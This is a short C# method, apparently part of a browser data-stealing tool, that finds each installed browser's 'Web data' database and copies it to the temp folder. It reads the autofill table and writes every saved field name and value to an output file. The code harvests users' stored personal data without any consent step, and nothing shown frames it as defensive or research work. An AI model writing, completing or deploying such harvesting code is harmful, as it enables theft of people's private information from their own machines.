// autofills
public static void SAVE(string filename)
{
    int counter = 0;

    using (StreamWriter sw = new StreamWriter(filename))
    {
        foreach (string browser in Paths.Browser)
        {
            string Browser = Paths.GetUserData(browser) + "Web data";
            if (File.Exists(Browser))
            {
                string temp = Environment.GetEnvironmentVariable("temp") + "\\browserAutofill";
                if (File.Exists(temp))
                {
                    File.Delete(temp);
                }
                File.Copy(Browser, temp);

                SQL sSQLite = new SQL(temp);
                sSQLite.ReadTable("autofill");

                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {
                    string name = sSQLite.GetValue(i, 0);
                    string value = sSQLite.GetValue(i, 1);

                    if (string.IsNullOrEmpty(value))
                    {
                        break;
                    }

                    try
                    {
                        sw.WriteLine($"Name: {name} | Value: {value}\t\n");
                        counter++;
                    }
                    catch { }

                    continue;
                }
            }
        }
    }

    Console.WriteLine($"Found {counter} autofills data and saved in {filename}");
}